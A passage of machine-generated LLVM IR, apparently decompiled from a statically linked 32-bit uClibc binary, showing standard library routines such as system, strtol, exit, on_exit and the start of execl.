  store i32 %v1_8060474, i32* %eax.global-to-local, align 4
  %v1_8060479 = inttoptr i32 %v1_8060474 to i32*
  store i32 22, i32* %v1_8060479, align 4
  %v0_806047f = load i32, i32* %stack_var_-36, align 4
  %v1_806047f = call i32 @__errno_location(i32 %v0_806047f)
  %v1_8060484 = inttoptr i32 %v1_806047f to i32*
  store i32 22, i32* %v1_8060484, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806048d

dec_label_pc_806048d:                             ; preds = %dec_label_pc_8060424, %dec_label_pc_8060460, %dec_label_pc_8060474
  %v0_8060494 = phi i32 [ 0, %dec_label_pc_8060424 ], [ 0, %dec_label_pc_8060460 ], [ -1, %dec_label_pc_8060474 ]
  store i32 %v0_80603ed, i32* @ebx, align 4
  store i32 %v0_80603ea, i32* @ebp, align 4
  ret i32 %v0_8060494

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806048d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060424, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_80604a1 = icmp eq i32 %arg1, 0
  br i1 %v4_80604a1, label %dec_label_pc_80605c4, label %dec_label_pc_80604ac

dec_label_pc_80604ac:                             ; preds = %entry
  %v2_80604b2 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_80604c1 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_80604d0 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_80604d9 = call i32 @__vfork(i32 %v2_80604d0)
  store i32 %v1_80604d9, i32* @ebx, align 4
  %v2_80604e3 = icmp slt i32 %v1_80604d9, 0
  %v2_80604e6 = icmp eq i1 %v2_80604e3, false
  br i1 %v2_80604e6, label %dec_label_pc_8060517, label %dec_label_pc_80604e8

dec_label_pc_80604e8:                             ; preds = %dec_label_pc_80604ac
  %v2_80604f0 = call i32 @__bsd_signal(i32 3, i32 %v2_80604b2)
  store i32 %v2_80604b2, i32* @edx, align 4
  %v2_80604fd = call i32 @__bsd_signal(i32 2, i32 %v2_80604c1)
  store i32 2, i32* @ebx, align 4
  %v2_806050a = call i32 @__bsd_signal(i32 17, i32 %v2_80604d0)
  br label %dec_label_pc_80605c1

dec_label_pc_8060517:                             ; preds = %dec_label_pc_80604ac
  %v1_80604e3 = icmp eq i32 %v1_80604d9, 0
  %v1_8060517 = icmp eq i1 %v1_80604e3, false
  br i1 %v1_8060517, label %dec_label_pc_8060563, label %dec_label_pc_8060519

dec_label_pc_8060519:                             ; preds = %dec_label_pc_8060517
  %v2_806051f = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_806052a = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8060535 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8060554 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806caeb.696 to i32), i32 ptrtoint ([3 x i8]* @global_var_806caf0.695 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cae8.694 to i32), i32 %arg1, i32 0)
  %v1_806055e = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8060563:                             ; preds = %dec_label_pc_8060517
  %v2_8060569 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8060574 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8060579 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8060582 = load i32, i32* @ebx, align 4
  %v7_8060583 = call i32 @wait4(i32 %v0_8060582, i32 %v2_8060579, i32 0, i32 0)
  %v8_806058b = icmp eq i32 %v7_8060583, -1
  %v1_806058c = icmp eq i1 %v8_806058b, false
  br i1 %v1_806058c, label %dec_label_pc_8060596, label %dec_label_pc_806058e

dec_label_pc_806058e:                             ; preds = %dec_label_pc_8060563
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8060596

dec_label_pc_8060596:                             ; preds = %dec_label_pc_8060563, %dec_label_pc_806058e
  %v2_806059e = call i32 @__bsd_signal(i32 3, i32 %v2_80604b2)
  store i32 3, i32* @ecx, align 4
  store i32 %v2_80604b2, i32* @ebx, align 4
  %v2_80605ab = call i32 @__bsd_signal(i32 2, i32 %v2_80604c1)
  store i32 %v2_80604c1, i32* @edx, align 4
  %v2_80605b8 = call i32 @__bsd_signal(i32 17, i32 %v2_80604d0)
  %v3_80605bd = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80605c1

dec_label_pc_80605c1:                             ; preds = %dec_label_pc_80604e8, %dec_label_pc_8060596
  %storemerge = phi i32 [ -1, %dec_label_pc_80604e8 ], [ %v3_80605bd, %dec_label_pc_8060596 ]
  br label %dec_label_pc_80605c4

dec_label_pc_80605c4:                             ; preds = %entry, %dec_label_pc_80605c1
  %v0_80605c8 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_80605c1 ]
  ret i32 %v0_80605c8

; uselistorder directives
  uselistorder i32 %v1_80604d9, { 1, 2, 0 }
  uselistorder i32 %v2_80604d0, { 1, 0, 2 }
  uselistorder i32 %v2_80604c1, { 0, 2, 1 }
  uselistorder i32 %v2_80604b2, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_80605c4, { 1, 0 }
  uselistorder label %dec_label_pc_80605c1, { 1, 0 }
  uselistorder label %dec_label_pc_8060596, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80605d7 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_80605d7
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80605f1 = inttoptr i32 %arg1 to i8*
  %v5_80605f1 = call i32 @_stdlib_strto_l(i8* %v4_80605f1, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80605f1
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_806060d = inttoptr i32 %arg1 to i8*
  %v5_806060d = call i32 @_stdlib_strto_l(i8* %v4_806060d, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v5_806060d
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_806061b = load i32, i32* @ebx, align 4
  store i32 %v0_806061b, i32* %stack_var_-16, align 4
  %v0_806061f = load i32, i32* @global_var_8074860, align 32
  %v4_8060625 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060625, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8060625, i32* %ebx.global-to-local, align 4
  %v2_806063241 = load i8, i8* %arg1, align 1
  %v3_806063242 = sext i8 %v2_806063241 to i32
  store i32 %v3_806063242, i32* %eax.global-to-local, align 4
  %v2_806063543 = mul nsw i32 %v3_806063242, 2
  %v3_806063544 = add i32 %v2_806063543, %v0_806061f
  %v4_806063545 = inttoptr i32 %v3_806063544 to i8*
  %v5_806063546 = load i8, i8* %v4_806063545, align 1
  %v6_806063547 = and i8 %v5_806063546, 32
  %v7_806063548 = icmp eq i8 %v6_806063547, 0
  %v1_806063949 = icmp eq i1 %v7_806063548, false
  br i1 %v1_806063949, label %dec_label_pc_8060631, label %dec_label_pc_806063b

dec_label_pc_8060631:                             ; preds = %entry, %dec_label_pc_8060631
  %v0_806063150 = phi i32 [ %v1_8060631, %dec_label_pc_8060631 ], [ %v4_8060625, %entry ]
  %v1_8060631 = add i32 %v0_806063150, 1
  store i32 %v1_8060631, i32* %ebx.global-to-local, align 4
  %v1_8060632 = inttoptr i32 %v1_8060631 to i8*
  %v2_8060632 = load i8, i8* %v1_8060632, align 1
  %v3_8060632 = sext i8 %v2_8060632 to i32
  store i32 %v3_8060632, i32* %eax.global-to-local, align 4
  %v2_8060635 = mul nsw i32 %v3_8060632, 2
  %v3_8060635 = add i32 %v2_8060635, %v0_806061f
  %v4_8060635 = inttoptr i32 %v3_8060635 to i8*
  %v5_8060635 = load i8, i8* %v4_8060635, align 1
  %v6_8060635 = and i8 %v5_8060635, 32
  %v7_8060635 = icmp eq i8 %v6_8060635, 0
  %v1_8060639 = icmp eq i1 %v7_8060635, false
  br i1 %v1_8060639, label %dec_label_pc_8060631, label %dec_label_pc_806063b

dec_label_pc_806063b:                             ; preds = %dec_label_pc_8060631, %entry
  %v0_8060631.lcssa = phi i32 [ %v4_8060625, %entry ], [ %v1_8060631, %dec_label_pc_8060631 ]
  %v2_8060632.lcssa = phi i8 [ %v2_806063241, %entry ], [ %v2_8060632, %dec_label_pc_8060631 ]
  %v3_8060632.lcssa = phi i32 [ %v3_806063242, %entry ], [ %v3_8060632, %dec_label_pc_8060631 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_806063b = icmp eq i8 %v2_8060632.lcssa, 43
  br i1 %v9_806063b, label %dec_label_pc_8060650, label %dec_label_pc_8060640

dec_label_pc_8060640:                             ; preds = %dec_label_pc_806063b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8060642 = icmp eq i8 %v2_8060632.lcssa, 45
  %v1_8060645 = icmp eq i1 %v9_8060642, false
  br i1 %v1_8060645, label %dec_label_pc_8060651, label %dec_label_pc_8060650

dec_label_pc_8060650:                             ; preds = %dec_label_pc_806063b, %dec_label_pc_8060640
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8060640 ], [ 0, %dec_label_pc_806063b ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8060650 = add i32 %v0_8060631.lcssa, 1
  store i32 %v1_8060650, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060651

dec_label_pc_8060651:                             ; preds = %dec_label_pc_8060640, %dec_label_pc_8060650
  %v0_8060663 = phi i32 [ %v0_8060631.lcssa, %dec_label_pc_8060640 ], [ %v1_8060650, %dec_label_pc_8060650 ]
  %v1_8060653 = and i32 %arg3, -17
  %v2_8060653 = icmp eq i32 %v1_8060653, 0
  %v1_8060659 = icmp eq i1 %v2_8060653, false
  br i1 %v1_8060659, label %dec_label_pc_806067f, label %dec_label_pc_806065b

dec_label_pc_806065b:                             ; preds = %dec_label_pc_8060651
  %v1_806065b = add i32 %arg3, 10
  store i32 %v1_806065b, i32* %esi.global-to-local, align 4
  %v1_806065e = inttoptr i32 %v0_8060663 to i8*
  %v2_806065e = load i8, i8* %v1_806065e, align 1
  %v8_806065e = icmp eq i8 %v2_806065e, 48
  %v1_8060661 = icmp eq i1 %v8_806065e, false
  br i1 %v1_8060661, label %dec_label_pc_8060675, label %dec_label_pc_8060663

dec_label_pc_8060663:                             ; preds = %dec_label_pc_806065b
  %v1_8060663 = add i32 %v0_8060663, 1
  store i32 %v1_8060663, i32* %ebx.global-to-local, align 4
  %v1_8060664 = add i32 %arg3, 8
  store i32 %v1_8060664, i32* %esi.global-to-local, align 4
  %v1_8060669 = inttoptr i32 %v1_8060663 to i8*
  %v2_8060669 = load i8, i8* %v1_8060669, align 1
  %v3_8060669 = zext i8 %v2_8060669 to i32
  %v5_8060669 = and i32 %v3_8060632.lcssa, -256
  %v6_8060669 = or i32 %v5_8060669, %v3_8060669
  %v1_806066b = or i32 %v6_8060669, 32
  %v3_806066b = trunc i32 %v1_806066b to i8
  store i32 %v1_806066b, i32* %eax.global-to-local, align 4
  %v10_806066e = icmp eq i8 %v3_806066b, 120
  %v1_8060670 = icmp eq i1 %v10_806066e, false
  br i1 %v1_8060670, label %dec_label_pc_8060675, label %dec_label_pc_8060672

dec_label_pc_8060672:                             ; preds = %dec_label_pc_8060663
  %v2_8060672 = mul i32 %v1_8060664, 2
  store i32 %v2_8060672, i32* %esi.global-to-local, align 4
  %v1_8060674 = add i32 %v0_8060663, 2
  store i32 %v1_8060674, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060675

dec_label_pc_8060675:                             ; preds = %dec_label_pc_8060663, %dec_label_pc_806065b, %dec_label_pc_8060672
  %v0_806069e12 = phi i32 [ %v1_8060663, %dec_label_pc_8060663 ], [ %v0_8060663, %dec_label_pc_806065b ], [ %v1_8060674, %dec_label_pc_8060672 ]
  %v0_80606f520 = phi i32 [ %v1_8060663, %dec_label_pc_8060663 ], [ %v4_8060625, %dec_label_pc_806065b ], [ %v1_8060663, %dec_label_pc_8060672 ]
  %v0_8060675 = phi i32 [ %v1_8060664, %dec_label_pc_8060663 ], [ %v1_806065b, %dec_label_pc_806065b ], [ %v2_8060672, %dec_label_pc_8060672 ]
  %v7_8060678 = icmp sgt i32 %v0_8060675, 16
  br i1 %v7_8060678, label %dec_label_pc_806067a, label %dec_label_pc_806067f

dec_label_pc_806067a:                             ; preds = %dec_label_pc_8060675
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806067f

dec_label_pc_806067f:                             ; preds = %dec_label_pc_8060675, %dec_label_pc_8060651, %dec_label_pc_806067a
  %v0_80606f521 = phi i32 [ %v0_80606f520, %dec_label_pc_8060675 ], [ %v4_8060625, %dec_label_pc_8060651 ], [ %v0_80606f520, %dec_label_pc_806067a ]
  %v0_806069e13 = phi i32 [ %v0_806069e12, %dec_label_pc_8060675 ], [ %v0_8060663, %dec_label_pc_8060651 ], [ %v0_806069e12, %dec_label_pc_806067a ]
  %v0_806068e = phi i32 [ %v0_8060675, %dec_label_pc_8060675 ], [ %arg3, %dec_label_pc_8060651 ], [ 16, %dec_label_pc_806067a ]
  %v1_806067f = add i32 %v0_806068e, -2
  store i32 %v1_806067f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_8060687 = icmp ugt i32 %v1_806067f, 34
  br i1 %v6_8060687, label %dec_label_pc_80606ea, label %dec_label_pc_8060689

dec_label_pc_8060689:                             ; preds = %dec_label_pc_806067f
  %div = udiv i32 -1, %v0_806068e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_806068e
  %v1_8060690 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_80606ca = urem i32 %arg4, 256
  br label %dec_label_pc_806069e

dec_label_pc_806069c:                             ; preds = %dec_label_pc_80606e0, %dec_label_pc_80606ca
  %v4_806069e.pre = phi i32 [ %v1_80606b4, %dec_label_pc_80606e0 ], [ %v4_806069e.pre.pre, %dec_label_pc_80606ca ]
  %v0_806069c = phi i32 [ %v1_80606bb, %dec_label_pc_80606e0 ], [ %v0_806069c.pre, %dec_label_pc_80606ca ]
  br label %dec_label_pc_806069e

dec_label_pc_806069e:                             ; preds = %dec_label_pc_8060689, %dec_label_pc_806069c
  %v0_80606f519 = phi i32 [ %v0_80606f521, %dec_label_pc_8060689 ], [ %v0_806069c, %dec_label_pc_806069c ]
  %v0_80606bb = phi i32 [ %v0_806069e13, %dec_label_pc_8060689 ], [ %v0_806069c, %dec_label_pc_806069c ]
  %v4_806069e = phi i32 [ %div, %dec_label_pc_8060689 ], [ %v4_806069e.pre, %dec_label_pc_806069c ]
  %v1_806069e = inttoptr i32 %v0_80606bb to i8*
  %v2_806069e = load i8, i8* %v1_806069e, align 1
  %v3_806069e = zext i8 %v2_806069e to i32
  %v5_806069e = and i32 %v4_806069e, -256
  %v6_806069e = or i32 %v3_806069e, %v5_806069e
  store i32 %v6_806069e, i32* %eax.global-to-local, align 4
  %v1_80606a0 = add i32 %v6_806069e, -48
  store i32 %v1_80606a0, i32* @ecx, align 4
  %v1_80606a3 = trunc i32 %v1_80606a0 to i8
  %tmp55 = icmp ult i8 %v1_80606a3, 10
  br i1 %tmp55, label %dec_label_pc_80606b4, label %dec_label_pc_80606a8

dec_label_pc_80606a8:                             ; preds = %dec_label_pc_806069e
  %v1_80606a8 = or i32 %v6_806069e, 32
  %v3_80606a8 = trunc i32 %v1_80606a8 to i8
  store i32 %v1_80606a8, i32* %eax.global-to-local, align 4
  %v1_80606ab = and i32 %v1_80606a0, -256
  %v2_80606ab = or i32 %v1_80606ab, 40
  store i32 %v2_80606ab, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_80606a8, 97
  br i1 %tmp56, label %dec_label_pc_80606b4, label %dec_label_pc_80606b1

dec_label_pc_80606b1:                             ; preds = %dec_label_pc_80606a8
  %v1_80606b1 = add i32 %v1_80606a8, -87
  store i32 %v1_80606b1, i32* @ecx, align 4
  br label %dec_label_pc_80606b4

dec_label_pc_80606b4:                             ; preds = %dec_label_pc_80606a8, %dec_label_pc_806069e, %dec_label_pc_80606b1
  %v0_80606e3 = phi i32 [ %v2_80606ab, %dec_label_pc_80606a8 ], [ %v1_80606a0, %dec_label_pc_806069e ], [ %v1_80606b1, %dec_label_pc_80606b1 ]
  %v1_80606b4 = urem i32 %v0_80606e3, 256
  store i32 %v1_80606b4, i32* %eax.global-to-local, align 4
  %v1_80606b7 = load i32, i32* %esi.global-to-local, align 4
  %v2_80606b7 = sub i32 %v1_80606b4, %v1_80606b7
  %v10_80606b7 = and i32 %v2_80606b7, %v1_80606b7
  %v11_80606b7 = icmp slt i32 %v10_80606b7, 0
  %v13_80606b7 = icmp slt i32 %v2_80606b7, 0
  %v2_80606b9 = icmp eq i1 %v13_80606b7, %v11_80606b7
  br i1 %v2_80606b9, label %dec_label_pc_80606ea, label %dec_label_pc_80606bb

dec_label_pc_80606bb:                             ; preds = %dec_label_pc_80606b4
  %v1_80606bb = add i32 %v0_80606bb, 1
  store i32 %v1_80606bb, i32* %ebx.global-to-local, align 4
  %v0_80606bc = load i32, i32* @edx, align 4
  %tmp = icmp ugt i32 %v0_80606bc, %div
  br i1 %tmp, label %dec_label_pc_80606ca, label %dec_label_pc_80606c2

dec_label_pc_80606c2:                             ; preds = %dec_label_pc_80606bb
  %v15_80606bc = icmp eq i32 %v0_80606bc, %div
  %v1_80606c2 = icmp eq i1 %v15_80606bc, false
  br i1 %v1_80606c2, label %dec_label_pc_80606e0, label %dec_label_pc_80606c4

dec_label_pc_80606c4:                             ; preds = %dec_label_pc_80606c2
  %v1_80606c4 = trunc i32 %v0_80606e3 to i8
  %tmp57 = icmp ugt i8 %v1_80606c4, %v1_8060690
  br i1 %tmp57, label %dec_label_pc_80606ca, label %dec_label_pc_80606e0

dec_label_pc_80606ca:                             ; preds = %dec_label_pc_80606c4, %dec_label_pc_80606bb
  store i32 %v4_80606ca, i32* %eax.global-to-local, align 4
  %v0_80606ce = load i32, i32* %ebp.global-to-local, align 4
  %v2_80606ce = and i32 %v0_80606ce, %v4_80606ca
  store i32 %v2_80606ce, i32* %ebp.global-to-local, align 4
  %v1_80606d0 = call i32 @__errno_location(i32 %div)
  store i32 %v1_80606d0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_80606d8 = inttoptr i32 %v1_80606d0 to i32*
  store i32 34, i32* %v1_80606d8, align 4
  %v0_806069c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_806069e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806069c

dec_label_pc_80606e0:                             ; preds = %dec_label_pc_80606c4, %dec_label_pc_80606c2
  %v4_80606e0 = mul i32 %v0_80606bc, %v1_80606b7
  store i32 %v1_80606b4, i32* %eax.global-to-local, align 4
  %v2_80606e6 = add i32 %v4_80606e0, %v1_80606b4
  store i32 %v2_80606e6, i32* @edx, align 4
  br label %dec_label_pc_806069c

dec_label_pc_80606ea:                             ; preds = %dec_label_pc_80606b4, %dec_label_pc_806067f
  %v0_80606f5 = phi i32 [ %v0_80606f521, %dec_label_pc_806067f ], [ %v0_80606f519, %dec_label_pc_80606b4 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_806067f ], [ %div, %dec_label_pc_80606b4 ]
  %v4_80606ea = icmp eq i32 %arg2, 0
  br i1 %v4_80606ea, label %dec_label_pc_80606f7, label %dec_label_pc_80606f1

dec_label_pc_80606f1:                             ; preds = %dec_label_pc_80606ea
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80606f5 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80606f5, i32* %v2_80606f5, align 4
  br label %dec_label_pc_80606f7

dec_label_pc_80606f7:                             ; preds = %dec_label_pc_80606ea, %dec_label_pc_80606f1
  %v0_80606f7 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80606f7, i32* %eax.global-to-local, align 4
  %v1_80606f9 = trunc i32 %v0_80606f7 to i8
  %v6_80606f9 = icmp eq i8 %v1_80606f9, 0
  %v2_80606fb = zext i1 %v6_80606f9 to i32
  %v1_80606fd4 = or i32 %v2_80606fb, -2147483648
  store i32 %v1_80606fd4, i32* %ebx.global-to-local, align 4
  %v5_8060703 = icmp eq i8 %tmp37, 0
  br i1 %v5_8060703, label %dec_label_pc_806071b, label %dec_label_pc_806070a

dec_label_pc_806070a:                             ; preds = %dec_label_pc_80606f7
  %v0_806070a = load i32, i32* @edx, align 4
  %tmp58 = icmp ugt i32 %v0_806070a, %v1_80606fd4
  br i1 %tmp58, label %dec_label_pc_806070e, label %dec_label_pc_806071b

dec_label_pc_806070e:                             ; preds = %dec_label_pc_806070a
  %v1_806070e = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_806070e, i32* %eax.global-to-local, align 4
  %v0_8060713 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8060713, i32* @edx, align 4
  %v1_8060715 = inttoptr i32 %v1_806070e to i32*
  store i32 34, i32* %v1_8060715, align 4
  %v0_806071b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_806071b

dec_label_pc_806071b:                             ; preds = %dec_label_pc_806070a, %dec_label_pc_80606f7, %dec_label_pc_806070e
  %v0_806071b = phi i32 [ %v0_80606f7, %dec_label_pc_806070a ], [ %v0_80606f7, %dec_label_pc_80606f7 ], [ %v0_806071b.pre, %dec_label_pc_806070e ]
  store i32 %v0_806071b, i32* %eax.global-to-local, align 4
  %v3_806071d = trunc i32 %v0_806071b to i8
  %v4_806071d = icmp eq i8 %v3_806071d, 0
  %v0_8060726.pre = load i32, i32* @edx, align 4
  br i1 %v4_806071d, label %dec_label_pc_8060723, label %dec_label_pc_8060721

dec_label_pc_8060721:                             ; preds = %dec_label_pc_806071b
  %v1_8060721 = sub i32 0, %v0_8060726.pre
  store i32 %v1_8060721, i32* @edx, align 4
  br label %dec_label_pc_8060723

dec_label_pc_8060723:                             ; preds = %dec_label_pc_806071b, %dec_label_pc_8060721
  %v0_8060726 = phi i32 [ %v1_8060721, %dec_label_pc_8060721 ], [ %v0_8060726.pre, %dec_label_pc_806071b ]
  store i32 %v0_8060726, i32* %eax.global-to-local, align 4
  %v2_8060728 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8060728, i32* @ebx, align 4
  ret i32 %v0_8060726

; uselistorder directives
  uselistorder i32 %v0_8060726, { 1, 0 }
  uselistorder i32 %v0_806071b, { 1, 0 }
  uselistorder i32 %v0_80606bc, { 2, 1, 0 }
  uselistorder i32 %v1_80606bb, { 1, 0 }
  uselistorder i32 %v2_80606b7, { 1, 0 }
  uselistorder i32 %v1_80606b4, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80606e3, { 1, 0 }
  uselistorder i32 %v0_806069c, { 1, 0 }
  uselistorder i32 %v4_80606ca, { 1, 0 }
  uselistorder i32 %div, { 2, 4, 1, 0, 3, 5 }
  uselistorder i32 %v0_806068e, { 1, 0, 2 }
  uselistorder i32 %v2_8060672, { 1, 0 }
  uselistorder i32 %v1_806066b, { 1, 0 }
  uselistorder i32 %v1_8060664, { 1, 0, 2 }
  uselistorder i32 %v0_8060663, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8060632.lcssa, { 1, 0 }
  uselistorder i32 %v0_8060631.lcssa, { 1, 0 }
  uselistorder i32 %v1_8060631, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8060625, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_806061f, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 -17, { 41, 1, 4, 5, 6, 7, 8, 9, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060723, { 1, 0 }
  uselistorder label %dec_label_pc_806071b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80606f7, { 1, 0 }
  uselistorder label %dec_label_pc_80606b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806069e, { 1, 0 }
  uselistorder label %dec_label_pc_806067f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060675, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060651, { 1, 0 }
  uselistorder label %dec_label_pc_8060650, { 1, 0 }
  uselistorder label %dec_label_pc_8060631, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8060743 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060743, i32* @ebx, align 4
  %v4_8060748 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134585853, i32 ptrtoint (i32* @global_var_8074840.761 to i32))
  %v1_8060754 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074840.761 to i32))
  %v0_8060759 = load i32, i32* @global_var_807d124.762, align 4
  %v1_8060761 = icmp eq i32 %v0_8060759, 0
  br i1 %v1_8060761, label %dec_label_pc_806076e, label %dec_label_pc_8060765

dec_label_pc_8060765:                             ; preds = %entry
  %v0_8060768 = load i32, i32* @esi, align 4
  %v1_8060769 = call i32 @unknown_0(i32 %v0_8060768)
  br label %dec_label_pc_806076e

dec_label_pc_806076e:                             ; preds = %entry, %dec_label_pc_8060765
  %v3_8060773 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8060778 = call i32 @__GI___uClibc_fini()
  %v0_8060789 = call i32 @_stdio_term()
  %v0_8060791 = load i32, i32* @esi, align 4
  %v1_8060792 = call i32 @__GI__exit(i32 %v0_8060791)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 3, 1, 10, 0, 13, 12, 11, 9, 8, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_806076e, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_806079b = call i32 @__new_exitfn()
  store i32 -1, i32* %eax.global-to-local, align 4
  %v1_80607a5 = icmp eq i32 %v0_806079b, 0
  br i1 %v1_80607a5, label %dec_label_pc_80607bf, label %dec_label_pc_80607a9

dec_label_pc_80607a9:                             ; preds = %entry
  %v2_80607ad = add i32 %v0_806079b, 4
  %v3_80607ad = inttoptr i32 %v2_80607ad to i32*
  store i32 %arg1, i32* %v3_80607ad, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_80607b4 = inttoptr i32 %v0_806079b to i32*
  store i32 2, i32* %v1_80607b4, align 4
  %v0_80607ba = load i32, i32* %eax.global-to-local, align 4
  %v2_80607ba = add i32 %v0_806079b, 8
  %v3_80607ba = inttoptr i32 %v2_80607ba to i32*
  store i32 %v0_80607ba, i32* %v3_80607ba, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80607bf

dec_label_pc_80607bf:                             ; preds = %entry, %dec_label_pc_80607a9
  %v0_80607c2 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80607a9 ]
  ret i32 %v0_80607c2

; uselistorder directives
  uselistorder i32 %v0_806079b, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80607bf, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80607c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80607c8, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80607cb = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80607cb, i32* %eax.global-to-local, align 4
